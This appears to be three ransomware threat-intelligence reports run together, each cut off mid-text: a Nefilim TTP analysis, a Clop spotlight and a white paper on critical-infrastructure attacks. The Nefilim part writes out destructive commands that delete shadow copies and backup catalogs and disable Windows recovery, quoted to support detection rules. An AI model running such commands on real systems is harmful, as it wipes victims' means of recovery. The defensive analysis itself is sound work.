adversaries may use legitimate tools with valid accounts as\nwell as their remote access tools.\n\n6.1. MITRE ATT&CK T1570 Lateral Tool Transfer\n\nThe Nefilim ransomware downloads the Psexec.exe  tool, and it also abuses the Windows built-in WMI  (Windows\nManagement Instrumentation) utility for lateral movement. PsExec is a free Microsoft tool that can be used to execute\ncommands and binaries on remote systems and download or upload a file over a network share. Nefilim uses PsExec\nand WMI with hard-coded admin credentials to remotely execute the batch files and the ransomware file in remote\nhosts.\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n526471 Remote File Encryption with PsExec 3244 PsExec Tool Remote Command Execution\n\n1. Collection\n\nAdversaries use the techniques in the Collection tactic to gather information relevant to their objectives. Various data\ntypes such as text, audio, and video are collected from multiple sources such as local system cloud, network drive,\nremovable media, and clipboard.  The next goal after data collection is often to exfiltrate the data.\n\n7.1 MITRE ATT&CK T1056.001 Input Capture: Keylogging\n\n \nThe Nefilim ransomware creates a DirectInput  object using the DirectDrawCreateEx  function to capture\nkeystrokes. Keylogging is both a Credential Access and Collection tactic.\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n431235 Input Capture Attack Scenario 5924 User Input Capture via PowerShell Script\n\n1. Exfiltration\n\nAdversaries use techniques in the Exfiltration tactic to steal data from your network. They encrypt or compress the\ndata to be exfiltrated and use different channels and protocols to avoid detection. For example, the Nefilim\nransomware compresses collected files and exfiltrates them to cloud storage.\n\nData loss protection is one of the top priority issues for CISOs today. Organizations utilize DLP solutions to protect\nand secure their data and comply with regulations. Picus simulates the exfiltration of a wide range of data over\ndifferent channels to test the effectiveness of both network and endpoint-based data loss prevention (DLP) solutions.\nPicus Threat Library includes hundreds of data files consisting of different types of information mapped to standards\nand regulations, including PII, PCI DSS, PHI, GDPR, HIPAA, PIPEDA, confidential files such as password files of\nOSs, and Intellectual Property (IP) data.\n\nSome examples of data exfiltration attacks in the Picus Threat Library are given in the following table:\n\n\n\n7/9\n\nPicus Threat Library - Threat\n\n107307 Italy PCI and PII Information Exfiltration including Full Credit Card Info\n\n893939 Italy PII Info. Exfiltration including Codice Fiscale \n\n727983 IBAN Numbers of 100 Countries Exfiltration in XLSX Format\n\n8.1 MITRE ATT&CK T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage\n\n \nNefilim operators use the MEGAsync  application to exfiltrate data to cloud storage. MEGAsync application\nsynchronizes folders between the infected computer and an adversary-controlled MEGA Cloud Drive.\n\n \n\n1. Impact\n\nThe Impact tactic covers techniques that manipulate, interrupt, or destroy your systems to disrupt availability,\ncompromise integrity, or cover a confidentiality breach.\n\n9.1 MITRE ATT&CK T1486 Data Encrypted for Impact\n\nLike other ransomware threats, Nefilim encrypts files on the target system using AES-128 and adds NEFILIM,\nNEPHILIM, MERIN, TRAPGET, MEFILIN, TELEGRAM, SIGARETA, or OFFWHITE  extension to encrypted files. It\nuses an RSA-2048 public key embedded in the ransomware executable to encrypt the AES encryption key. It also\nadds a file that includes the ransom note to the root directory, such as C:\\NEFILIM-DECRYPT.txt .\n\nNefilim abuses Microsoft's Enhanced Cryptographic Provider to import cryptographic keys and encrypt data with API\nfunctions such as CryptImportKey , CryptAcquireContext , CryptCreateHash , CryptHashData ,\nCryptDeriveKey , CryptReleaseContext , CryptDestroyKey , CryptEncrypt .This behavior  is a very specific\n\nTTP of ransomware.\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n767981 File Encryption with PowerShell 4737 Cryptography Encryptor and Decryptor Utilization via PowerShell\n\n9.2 MITRE ATT&CK T1490 Inhibit System Recovery\n\nDeleting volume shadow copies is very typical behavior of ransomware. The Nefilim ransomware uses WMIC  with\nthe following command to delete all volume shadow copies on the system to prevent recovery. WMIC  is a command-\nline utility to access WMI.\n\n\n\n8/9\n\nwmic shadowcopy delete\n\nNefilim also uses bcdedit.exe twice to disable automatic Windows recovery features by modifying boot configuration\ndata.\n\nbcdedit /set {default} recoveryenabled No\n bcdedit /set {default} bootstatuspolicy ignoreallfailures\n\nMoreover, the Nefilim ransomware uses wbadmin to delete the backup catalog:\n\nwbadmin delete catalog -quiet\n\nPicus Threat Library - Threat Picus Mitigation Library - Detection Rule\n\n205796  Inhibit System Recovery by Deleting All Volume Shadow\nCopies with WMIC\n\n7087 Shadow Copy Deletion via WMIC\nTool\n\n562990 Inhibit System Recovery by Disable Automatic Windows\nRecovery Features with bcdedit\n\n3165 Disabling Windows Recovery\nFeatures via Bcdedit Tool\n\n407822 Inhibit System Recovery by Deleting Windows Backup\nCatalog with Vbadmin\n\n7067 Deleting Windows Backup Catalog\nvia Vbadmin tool\n\nNefilim TTP Map\n\nTTP Map of Nefilim that is created with TTPs detected from dozens of Nefilim ransomware samples can be found in\nthe table below.\n\nAlthough these TTPs are determined from the Nefilim samples, they are common in most ransomware families. The\nred techniques are very specific ransomware TTPs.\n\n\n\n9/9\n\nConclusion\n\nWe analyzed dozens of Nefilim ransomware samples to determine tactics, techniques and procedures (TTPs) utilized\nby Nefilim. Continuously monitoring adversary TTPs within a company’s IT system allows companies to discover\nadversary behaviors and stop them before they can go any further. Picus emulates adversary TTPs and gives\nactionable mitigation information for each TTP for building a proactive defense against adversaries and their\nmalware.",

We review\nthis ransomware group’s constantly changing schemes and discuss how companies can shore up defenses against this threat.\n\nhttps://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-clop\n\n\n2/9\n\n View infographic of \"Ransomware Spotlight: Clop\"\n\nClop (sometimes stylized as “Cl0p”) has been one of the most prolific ransomware families in the past three years. It has gained infamy for\ncompromising high-profile organizations in various industries worldwide using multilevel extortion techniques that resulted in huge payouts\nestimated at US$500 million as of November 2021. In concerted efforts to dismantle ransomware cartels, a global coalition across five\ncontinents that involved law enforcement and private partners led to the arrests in Ukraine of six suspected Clop members in June 2021.\n\nWhile the arrests in Ukraine might have dealt a big blow to Clop’s operations, the group’s criminal activities have gone unabated: Our\ndetections of attack attempts showed non-stop malicious activities from January 2021 to January 2022. Reports mentioned that only parts of\nthe ransomware’s operations, such as the server infrastructure used by affiliates to disseminate the malware and the channels used to launder\ncryptocurrency ransom payments that were illegally obtained, were seized and taken down, respectively.\n\nAs enterprises ponder on ways to bolster their security defenses in the post-pandemic era, learning more about potential threats is essential to\nadopting a proactive cybersecurity approach. In this report, we focus the spotlight on the notorious Clop ransomware’s operations.\n\nHistory of Clop\n\nClop evolved as a variant of the CryptoMix ransomware family. In February 2019, security researchers discovered the use of Clop by the threat\ngroup known as TA505 when it launched a large-scale spear-phishing email campaign. Clop is an example of ransomware as a service\n(RaaS) that is operated by a Russian-speaking group. Additionally, this ransomware used a verified and digitally signed binary, which made it\nlook like a legitimate executable file that could evade security detection.\n\nIn 2020, it was reported that FIN11 — a financially motivated hacking group — deployed Clop ransomware and threatened their victims to\npublish exfiltrated data. FIN11 exploited zero-day vulnerabilities in the legacy file transfer appliance (FTA) of Kiteworks (formerly known as\nAccellion) to infiltrate the network of the victims. It then aimed to deliver the Clop ransomware as its payload and steal data as well.\nResearchers also discovered that the group used a specific web shell that was referred to as “DEWMODE” to exfiltrate stolen information from\nits victims.\n\nResearchers found two groups of malicious actors that have known connections to FIN11 and identified them as UNCA2546 and UNCA2582.\nThese were also the groups responsible for the massive attacks on Kiteworks users.\n\nThe operators behind Clop made their first attempt at using the double extortion scheme in April 2020 when they publicized the data of\na pharmaceutical company on their leak site. Clop’s dedicated leak site hosts its list of victims, which has markedly grown since its launch.\nOver time, the gang’s extortion tactics have become more sophisticated and thus more destructive.\n\nIn November 2021, security researchers detected malicious activity by Clop operators that exploited a SolarWinds Serv-U vulnerability to\nbreach corporate networks and deliver the Clop ransomware as a payload. The Serv-U Managed File Transfer and Serv-U Secure FTP remote\ncode execution (RCE) vulnerability, tracked as CVE-2021-35211, allowed RCE on the vulnerable server with elevated privileges. \n\nhttps://documents.trendmicro.com/images/TEx/articles/Clop-Infographic-znZAgj7.jpg\nhttps://www.trendmicro.com/vinfo/tr/security/definition/ransomware\nhttps://ipdefenseforum.com/2021/08/south-korean-police-help-take-down-cyber-threat-in-ukraine/\nhttps://www.trendmicro.com/en_us/research/21/k/global-operations-lead-to-arrests-of-alleged-members-of-gandcrab.html\nhttps://www.bleepingcomputer.com/news/security/clop-ransomware-is-back-in-business-after-recent-arrests/\nhttps://www.webroot.com/blog/2016/07/22/about-cryptomix-ransomware/\nhttps://www.trendmicro.com/vinfo/tr/security/definition/spear-phishing\nhttps://www.trendmicro.com/vinfo/tr/security/definition/ransomware-as-a-service-raas\nhttps://www.cybereason.com/blog/cl0p-ransomware-gang-tries-to-topple-the-house-of-cards\nhttps://www.trendmicro.com/vinfo/tr/security/definition/zero-day-vulnerability\nhttps://success.trendmicro.com/solution/000283514\nhttps://www.kiteworks.com/sites/default/files/resources/accellion-company-overview.pdf\nhttps://www.trendmicro.com/vinfo/tr/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti\nhttps://techcrunch.com/2020/04/27/execupharm-clop-ransomware/\nhttps://www.bleepingcomputer.com/news/security/clop-gang-exploiting-solarwinds-serv-u-flaw-in-ransomware-attacks/\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35211#:~:text=Microsoft%20discovered%20a%20remote%20code,machine%20hosting%20Serv%2DU%20Only.\n\n\n3/9\n\nA maritime services giant with headquarters in Singapore also fell prey to Clop. In November 2021, it was reported that Clop breached its IT\nsystems to steal classified proprietary commercial information and employee data that included bank account details, payroll information,\npassports, email addresses, and internal correspondence, among others.\n\n \n\nAn overview of Clop operations\n\nThe Clop ransomware appends the “.ClOP” (“Clop” spelled with a small “L”) extension to the files it encrypts. Researchers also discovered that\nClop targets a victim’s entire network instead of just individual computers. This is made possible by hacking into the Active Directory (AD)\nserver before the ransomware infection to determine the system’s Group Policy. This allows the ransomware to persist in the endpoints even\nafter incident responders have already cleaned them up.\n\nPrevious attacks by the TA505 group saw the delivery of the Clop malware as the final stage of its payload in massive phishing campaigns.\nThe malicious actors would send spam emails with HTML attachments that would redirect recipients to a macro-enabled document such as an\nXLS file used to drop a loader named Get2. This loader facilitates the download of various tools such as SDBOT, FlawedAmmyy, and Cobalt\nStrike. Once the malicious actors intrude into the system, they proceed to reconnaissance, lateral movement, and exfiltration to set the stage\nfor deployment of the Clop ransomware.\n\nThe operators behind Clop coerce their victims by sending out emails in a bid for negotiations. They also resort to more severe threats such as\npublicizing and auctioning off the stolen information on their data leak site “Cl0p^_-Leaks” if their messages are ignored. They have also gone\nto the extent of using quadruple extortion techniques, which have involved going after top executives and customers to pressure companies\ninto settling the ransom.\n\nHaving established itself well in the world of cybercrime, the Clop ransomware gang is deemed as a trendsetter for its ever-changing tactics,\ntechniques, and procedures (TTPs). Indeed, the group’s Kiteworks FTA exploits set a new trend as these significantly pulled up the average\nransom payments for the first quarter of 2021. A report that cited Coveware’s findings revealed that the average ransomware payments\nsignificantly went up to US$220,298, which is an increase of 43%. It also said that the median ransom payment increased sharply to\nUS$78,398 from US$49,459, which translates to a 60% hike.\n\nTop affected countries and industries\n\nIn this section, we discuss Trend Micro™ Smart Protection Network™ (SPN) data on detections of Clop attempts to compromise organizations.\nOur detections reveal that the US had the largest number of attack attempts at 2,214 followed by Spain at a distant second with 505 attempts.\nThe rest of the detections are spread across North America, South America, Asia Pacific, Europe, and the Middle East.\n\nFigure 1. 10 countries with the highest number of attack attempts per machine for the Clop ransomware (January 1, 2021 to January 31, 2022)\n\nWhile other known RaaS operators claim to avoid the healthcare sector as a target out of humanitarian consideration, our detections reveal\nthat this is not the case for Clop, as this sector received the highest number of detections at 959, followed by the financial industry at 150.\nFigure 2 shows the breakdown of detections according to industry.\n\n \n\nhttps://www.bleepingcomputer.com/news/security/marine-services-provider-swire-pacific-offshore-hit-by-ransomware/\nhttps://www.hornetsecurity.com/en/security-information/clop-clop-ta505-html-malspam-analysis/?_adin=11551547647\nhttps://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/SDBOT/\nhttps://success.trendmicro.com/solution/1123301-flawedammyy-malware-information#:~:text=FlawedAmmyy%20is%20a%20remote%20access,on%20leaked%20Ammyy%20Admin%20software.&text=Upon%20infection%2C%20the%20RAT%20can,Capture%20screenshots\nhttps://www.trendmicro.com/en_us/research/21/g/tracking_cobalt_strike_a_vision_one_investigation.html#:~:text=Cobalt%20Strike%20is%20a%20well,and%20remove%20a%20malware%20infection.\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti\nhttps://www.zdnet.com/article/some-ransomware-gangs-are-going-after-top-execs-to-pressure-companies-into-paying/\nhttps://securityaffairs.co/wordpress/116029/cyber-crime/clop-ransomware-extortion.html\nhttps://www.bleepingcomputer.com/news/security/accellion-data-breaches-drive-up-average-ransom-price/\nhttps://www.bleepingcomputer.com/news/security/accellion-data-breaches-drive-up-average-ransom-price/\nhttps://documents.trendmicro.com/images/TEx/articles/RS-Clop-Fig-1-fK1uLPa.jpg\n\n\n4/9\n\nFigure 2. 10 industries with the highest number of attack attempts per machine for the Clop ransomware (January 1, 2021 to January 31,\n2022)\n\n Source: Trend Micro Smart Protection Network infrastructure\n\nBy breaking down the detections per month, we are able to determine that 2021 saw the peak of Clop attacks in June of the same year at 784\nattack attempts. March also saw a steep rise in attempts at 663, which was significantly higher than the detections in prior months. Our\ndetections suggest that Clop operations have remained robust as numbers consistently straddled the 300 to 400 range from July 2021 to\nJanuary 2022.\n\nFigure 3. Monthly breakdown of detections per machine for the Clop ransomware (January 1, 2021 to January 31, 2022)\n Source: Trend Micro Smart Protection Network infrastructure\n\nWe also looked into Clop’s leak site to gain insights into the operators’ successful attacks from December 16, 2021 to January 15, 2022.\nDuring this period, only two organizations — both small businesses — were successfully compromised by Clop operators. One organization\nbelongs to the legal sector, while the other belongs to the fashion and apparel sector. Both organizations are based in North America, and as\nobserved in the aforementioned period, have yet to pay ransom.\n\nInfection chain and techniques\n\nThe Clop ransomware that TA505 first distributed evaded detection by using a binary that was digitally signed and verified to make it seem like\na legitimate executable file. The group launched a large volume of spear-phishing emails that were sent to the employees of an organization to\ntrigger the infection process. Figure 4 shows the infection chain.\n\nhttps://documents.trendmicro.com/images/TEx/articles/RS-Clop-Fig-2-6bsGetn.jpg\nhttps://documents.trendmicro.com/images/TEx/articles/RS-Clop-Fig-3-rUsdjPx.jpg\n\n\n5/9\n\nFigure 4. The first infection chain of TA505\n\nIn January 2020, TA505 changed the flow of infection by using SDBOT alone to collect and exfiltrate data to the command-and-control (C&C;)\nserver. Figure 5 shows the modified infection chain.\n\nFigure 5. The modified infection chain of TA505\n\nFigure 6. The infection chain of FIN11\n\nFigure 6 shows the infection chain of FIN11’s exploit of the multiple zero-day vulnerabilities in Kiteworks’ FTA so that it could install a newly\ndiscovered web shell, DEWMODE. FIN11 then used this same web shell to exfiltrate data from the FTA and deliver the Clop ransomware as a\npayload. \n\n \n\nInitial Access\n\nhttps://documents.trendmicro.com/images/TEx/articles/RS-Clop-Fig-4-SxnXSXE.jpg\nhttps://documents.trendmicro.com/images/TEx/articles/RS-Clop-Fig-5-l8cf3OV.jpg\nhttps://documents.trendmicro.com/images/TEx/articles/RS-Clop-Fig-6-ytyWSYF.jpg\n\n\n6/9\n\nThe threat actors behind the Clop ransomware use an established network of affiliates to gain initial access and send a large volume of spear-\nphishing emails to employees of an organization to induce infection. The malicious actors use a compromised RDP to penetrate the system\neither by attempting to brute-force passwords or by exploiting some known vulnerabilities. The following are the Kiteworks FTA zero-day\nexploits that they used in early 2021:\n\nCVE-2021-27101 – SQL injection via a crafted host header\nCVE-2021-27102 – Operating system command execution via a local web service call\nCVE-2021-27103 – SSRF via a crafted POST request\nCVE-2021-27104 – Operating system command execution via a crafted POST request\n\nThe ransomware group was reported to have exploited the SolarWinds Serv-U product vulnerability tagged as CVE-2021-35211.\n\n \n\nDiscovery\n\nClop’s ransomware toolkit contained several malware types to harvest information:\n\nFlawedAmmyy remote access trojan (RAT) collects information and attempts to communicate with the C&C; server to enable the\ndownload of additional malware components.\nAfter getting through the AD server, it will download an additional hacking tool, Cobalt Strike.\nSDBOT, another RAT, propagates the infection in many ways, including exploiting vulnerabilities and dropping copies of itself in\nremovable drives and network shares. It is also capable of propagating when shared through peer-to-peer (P2P) networks. Malicious\nactors use SDBOT as a backdoor to enable other commands and functions to be executed in the compromised computer.\n\n \n\nLateral Movement, Discovery, and Defense Evasion\n\nAt this stage, the malware scans for the workgroup information of the machine to distinguish personal machines from enterprise ones. If the\nworkgroup is the default by value, the malware will stop malicious behavior and delete itself. If the AD server domain is returned, a machine\ngets classified as a corporate machine. The malware attempts to hack the AD server using Server Message Block (SMB) vulnerabilities and\nusing the added downloaded hacking tool Cobalt Strike. Cobalt Strike is a known tool for post-exploitation that has been previously connected\nto other ransomware families. Meanwhile, TinyMet is used to connect the reverse shell to the C&C; server. The AD server admin account is\nused to propagate the Clop ransomware to internal network machines. As for SDBOT, it uses application shimming to preserve the continuity\nof the attack and to avoid detection.\n\n \n\nExfiltration\n\nOne attack was observed as using DEWMODE to exfiltrate stolen data.\n\n \n\nImpact\n\nThe ransomware payload that terminates various Windows services and processes proceeds to its encryption routine.\n\nMITRE tactics and techniques\n\nInitial\nAccess Execution Persistence\n\nPrivilege\nEscalation Defense Evasion Discovery\n\nLateral\nMovement Collection\n\nhttps://www.aha.org/system/files/media/file/2021/02/h-isac-tlp-white-bulletin-cisa-notifies-exploitation-accellion-file-transfer-appliance-2-24-21.pdf\nhttps://thehackernews.com/2020/06/SMBleed-smb-vulnerability.html\nhttps://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/hacktool.win32.tinymet.k/\n\n\n7/9\n\nInitial\nAccess Execution Persistence\n\nPrivilege\nEscalation Defense Evasion Discovery\n\nLateral\nMovement Collection\n\nT1566.001 -\nPhishing:\nSpear-\nphishing\nattachment\n\nArrives via\nphishing\nemails that\nhave Get2\nLoader,\nwhich will\ndownload the\nSDBot and\nFlawedAmmy\nRAT\n\nT1190 -\nExploit\npublic-facing\napplication\n\n Arrives via\nany the\nfollowing\nexploits:•\nCVE-2021-\n27101• CVE-\n2021-27102•\nCVE-2021-\n27103• CVE-\n2021-27104•\nCVE-2021-\n35211\n\nT1078 -

Moreover, the operators behind Clop are known to regularly change their TTPs, which\nmeans that expecting them to sharpen the proverbial saw is par for the course. It is therefore best to stay vigilant and armed with the\nknowledge that ransomware operators are always waiting for a chance to pounce on their next victim.\n\nTo protect systems against similar threats, organizations can establish security frameworks that allocate resources systematically for\nestablishing a strong defense strategy against ransomware.\n\nHere are some best practices that organizations can consider:\n\n \n\nAudit and inventory\n\nTake an inventory of assets and data.\nIdentify authorized and unauthorized devices and software.\nMake an audit of event and incident logs.\n\n \n\nConfigure and monitor\n\nManage hardware and software configurations.\nGrant admin privileges and access only when necessary to an employee’s role.\nMonitor network ports, protocols, and services.\nActivate security configurations on network infrastructure devices such as firewalls and routers.\nEstablish a software allowlist that only executes legitimate applications.\n\n \n\nPatch and update\n\nConduct regular vulnerability assessments.\nPerform patching or virtual patching for operating systems and applications. \nUpdate software and applications to their latest versions. \nTo prevent attacks like the Kiteworks FTA exploits, update to and patch the latest version of the FTA to clear the zero-day vulnerabilities\nthat were released by the malicious actors and dedicated to the attack signatures.\n\n \n\nProtect and recover\n\n\n\n9/9\n\nImplement data protection, backup, and recovery measures.\nEnable multifactor authentication (MFA). \n\n \n\nSecure and defend\n\nEmploy sandbox analysis to block malicious emails.\nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network.\nDetect early signs of an attack such as the presence of suspicious tools in the system.\nUse advanced detection technologies such as those powered by AI and machine learning.\n\n \n\nTrain and test\n\nRegularly train and assess employees on security skills.\nConduct red-team exercises and penetration tests.\n\nA multilayered approach can help organizations guard the possible entry points into the system (endpoint, email, web, and network). Security\nsolutions that detect malicious components and suspicious behavior could also help protect enterprises.\n\nTrend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools\nearly on before the ransomware can do irreversible damage to the system.\nTrend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities. This\nprotection is made possible through techniques such as virtual patching and machine learning.\nTrend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block\nmalicious emails, including phishing emails that can serve as entry points for ransomware.\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats\nand ransomware, ensuring the protection of endpoints.\n\nIndicators of Compromise (IOCs)\n\nThe IOCs for this article can be found here.

The interruption of power, water, or transportation systems can have \na major impact on ordinary citizens and put huge pressure on organizations \nand governments to restore systems quickly.\n\nThe Stuxnet attack on the Iranian nuclear enrichment program that was \ndiscovered in 2010, an attack on the power grid in Ukraine in 2015, and \nthe recent attack on the Colonial Pipeline in the U.S., are just some of the \nhigh-profile incidents affecting CNI that have been publicly reported. Cyber \nattacks on power grids can cause anxiety due to the potential negative \nimpacts they can have on ordinary citizens: the attack in Ukraine occurred \nin December, cutting out power and heat for citizens in the middle of \nEurope’s winter. Thankfully, in that case, power was restored reasonably \nquickly, but the fact that attackers were able to gain access to the power \ngrid to shut it down in the first place was a cause for significant concern.\n\nThe recent Colonial Pipeline attack in the U.S. also caused a huge reaction, \nleading to people stockpiling gasoline amid fears of a fuel shortage. In a \nworld where almost all systems are internet connected to some degree, \ngood cyber security in CNI has never been more important.\n\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nThis paper will look at some of the most high-profile cyber attacks on CNI we have observed, including the \nColonial Pipeline attack, and some previously unpublished research into an attack campaign aimed at some CNI \ninfrastructure in a South East Asian country. \n\nWe will also look at what Symantec data tells us about malicious activity aimed at the CNI sector, and the steps you \ncan take to help protect your organization. \n\nSome of the key points covered in this paper:\n\n•\t The Colonial Pipeline incident and other recent attacks have underlined the disruptive potential of \nransomware for CNI and the pressure that can be exerted on organizations to pay ransoms in an effort to \nrestore essential services quickly, making them a prime target for ransomware criminals.\n\n•\t Attacks on CNI are a global issue, with high-profile incidents having occurred in the U.S., Europe, and the \nMiddle East.\n\n•\t Symantec data indicates that an increasing number of malicious actors are attempting to attack CNI \norganizations, but the number of attackers successfully installing malware on the endpoint in the sector is \ntrending down.\n\n•\t Attacks on CNI can be hard to contain or keep under wraps for affected businesses, leading to potential \ndamage to business reputation as well as major effects on ordinary citizens. This was demonstrated in both \nthe Colonial Pipeline and Ukraine power grid attacks.\n\n•\t A comprehensive cyber security strategy with the implementation of policies like network segmentation, Zero \nTrust, and multi-factor authentication is essential for businesses in this sector, particularly in order to keep \nproduction networks safe even if corporate networks become infected.\n\n•\t Malicious actors targeting this sector use living-off-the-land tools and techniques, as well as malware, to \ntarget and infect victims.\n\n•\t Though rare, we have seen both destructive attacks and attacks with physical impact aimed at organizations \nin the CNI sector, so this is something companies in this sector need to be aware of. Due to the wide impact \ndisruption of organizations in this sector can have, organizations need to be aware they could be the subject \nof attacks from highly skilled, nation-state-backed malicious actors.\n\nMethodology\nCritical National Infrastructure (CNI) is a broad sector that encompasses a number of different industries. The \nCybersecurity and Infrastructure Security Agency (CISA) lists 16 critical infrastructure sectors “whose assets, \nsystems, and networks, whether physical or virtual, are considered so vital to the United States that their \nincapacitation or destruction would have a debilitating effect on security, national economic security, national \npublic health or safety, or any combination thereof.” This includes the following:\n\n•\t Healthcare and Public Health\n•\t Financial Services\n•\t Food and Agriculture\n•\t Transportation Systems\n•\t Information Technology\n•\t Government Facilities\n•\t Emergency Services\n•\t Dams\n•\t Communications\n•\t Chemical\n•\t Commercial Facilities \n•\t Critical Manufacturing\n•\t Defense Industrial Base\n•\t Energy \n•\t Nuclear Reactors, Materials, and Waste\n•\t Water and Wastewater Systems \n\nhttps://www.cisa.gov/critical-infrastructure-sectors\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nHowever, given the size of some of these sectors, for the purposes of this paper we will be concentrating primarily \non a subset of these sectors, including the following:\n\n•\t Energy Sector\n\n•\t Dams\n\n•\t Chemical\n\n•\t Nuclear Reactors, Materials, and Waste\n\n•\t Water and Wastewater Systems\n\n•\t Critical Manufacturing\n\n•\t Transportation Systems\n\n•\t Commercial Facilities \n\nColonial Pipeline: U.S. Infrastructure Under Attack\nOn May 7, 2021, Colonial Pipeline, one of the biggest fuel pipelines in the U.S., providing 45% of the fuel consumed \non the East Coast, was forced to shut down operations following a ransomware attack.\n\nThe finger of blame for this incident was quickly pointed at a group called Darkside (aka Coreid), a ransomware-as-\na-service operation that is widely believed to operate from Eastern Europe. This attack attracted a huge number of \nheadlines in the U.S. and around the globe, a response from the White House, and, seemingly, the shutdown of the \noperations of the ransomware gang responsible.\n\nThe Attack\n\nThe Colonial Pipeline is 5,500 miles long, travels through 14 states and is responsible for providing almost half of the \nfuel supply of the East Coast of the U.S. Its shutdown caused alarm among residents of eastern and southeastern \nstates of the U.S., with fears that a prolonged shutdown could lead to fuel shortages and price hikes. The level of \npanic was such that there were reports of gas stations running out of fuel, and people going so far as to fill plastic \nbags with gasoline. \n\nIn a statement about the attack, Colonial said it temporarily shut down all its pipeline operations after learning it \nhad been hit by a cyber attack on some of its “information technology” systems. The firm said it “proactively took \ncertain systems offline to contain the threat.”\n\nThe seriousness of the attack was underlined when the government invoked emergency powers in response to the \nhack. The Department of Transportation issued an emergency declaration on May 9 in response to the incident \nto relax regulations for drivers carrying gasoline, diesel, jet fuel, and other refined petroleum products in 17 states \nand the District of Columbia. It allowed them to work extra or more flexible hours to make up for any fuel shortage \nrelated to the pipeline outage.\n\nThankfully, Colonial was able to restart the pipeline five days after it had shut it down, although it did say it would \ntake “several days for the product delivery supply chain to return to normal.”\n\nWhile it wasn’t initially clear whether or not Colonial had paid a ransom to the attackers, Bloomberg News reported \non May 13 that the company had paid a ransom of $4.4 million. The company reportedly paid the ransom within \nhours of the attack occurring, and received a decryption key from the attackers. However, the decryption process \nwas reportedly so slow that the company also continued to use its own backups to recover from the attack.\n\nSpeaking in front of the U.S. Senate Homeland Security and Governmental Affairs Committee on June 8, Colonial \nPipeline’s CEO Joseph Blount defended his decision to pay the ransom to the attackers, stating that he had “put \nthe interests of the country first.” He also revealed that the attackers gained initial access to the company’s network \nthrough a “legacy VPN” account that the company’s IT team did not know existed. The account was protected with \nonly a password and did not have multi-factor authentication enabled. \n\nhttps://www.washingtonpost.com/business/2021/05/08/cyber-attack-colonial-pipeline/\nhttps://www.bloomberg.com/news/articles/2021-05-13/colonial-pipeline-paid-hackers-nearly-5-million-in-ransom\nhttps://www.bloomberg.com/news/articles/2021-05-13/colonial-pipeline-paid-hackers-nearly-5-million-in-ransom\nhttps://www.bloomberg.com/news/articles/2021-05-13/colonial-pipeline-paid-hackers-nearly-5-million-in-ransom\nhttps://www.bankinfosecurity.com/colonial-ceo-at-senate-hearing-details-ransomware-attack-a-16836\n\n\nAttacks Against Critical Infrastructure\n\nWhite Paper\n\nThe Attackers\n\nDarkside, which Symantec tracks as Coreid, is a ransomware-as-a-service operation that works with affiliates \nto conduct ransomware attacks and takes a share of the profits. Coreid develops the malware and affiliates \ncarry out the attacks. Like most ransomware actors these days, Coreid carries out what are known as “double \nextortion” attacks, where they steal victims’ data and threaten to publish it to further pressure victims into paying \nthe ransom demand. An unusual aspect of Coreid’s operation is that it claims to prohibit affiliates from attacking \ncertain organizations, including hospitals, hospices, schools, universities, non-profit organizations, and government \nagencies.\n\nThe group was first seen in August 2020, but a new level of interest was drawn to the group in the wake of the \nattack on Colonial Pipeline. Coreid had been noted for the level of “professionalism” employed by the group since it \nemerged, with the gang reportedly even providing a phone number and a help desk to facilitate negotiations with \nvictims. This “professionalism” was evident in the wake of the Colonial attack too, with the group issuing a press \nrelease after it was named as the perpetrator of this attack. The group said it was “apolitical” and not associated \nwith any government, and also stated that its goal was to make money, and not create problems for society. It said \nthat in the future it would introduce moderation and check each company that its partners want to encrypt to \navoid “social consequences.”\n\nCoreid is believed to be a financially-motivated cyber crime group, and is not thought to be nation-state-backed or \ninterested in cyber espionage. While Symantec cannot definitively say where Coreid is based, public reports state \nthe group is based in Eastern Europe, with Russia considered to be its most likely base. The group does check for \nthe language used on infected machines and does not proceed with an attack if Russian or several other languages \nspoken in former Soviet bloc nations are installed on the machine. \n\nCoreid is thought to be a very profitable ransomware group, having reportedly taken in around $90 million. \nBlockchain analysis firm Elliptic found and analyzed payments made to Coreid from 47 different Bitcoin wallets, \nwith the payments totaling $90 million, which would mean the average ransom paid to Coreid was approximately \n$1.9 million. This would put Coreid at the high end of ransomware earners that we have seen, with this amount of \nmoney also collected in a reasonably short period of time, considering the group only emerged in August 2020. \nThe Coreid operators are believed to keep 10% to 25% of the profits of attacks, with the rest going to affiliates, \nso the malware developers themselves are estimated to have made approximately $15.5 million. Nevertheless, it \nis difficult to determine exactly how much money is made by ransomware actors, so the true figure may be even \nhigher.\n\nHowever, it appears the Colonial Pipeline attack may have been an attack too far for the group, with Darksupp, an \nadmin for the Coreid group, announcing on an underground forum on May 14 that the group had lost access to its \ndata leaks site, payment servers, and content delivery network (CDN) servers following law enforcement action in \nthe wake of the Colonial attack. This news came after U.S. President Joe Biden announced that countries harboring \nransomware networks must take action to shut them down. “We have been in direct communication with Moscow \nabout the imperative for responsible countries to take decisive action against these ransomware networks,” he said. \n\nThe group was paid $9.4 million in ransoms—from Colonial Pipeline ($4.4 million) and German chemical company \nBrenntag ($5 million)—in the weeks before it shut down, causing speculation that the group may have decided \nto cash out and keep those profits rather than sharing with affiliates. However, on June 7 it was announced that \nauthorities in the U.S. had recovered 63.7 of the 75 bitcoins Colonial had paid to Coreid. The Department of Justice \nsaid the FBI recovered the money after they gained access to one account’s private key.\n\nThere is no doubt the increased attention on the 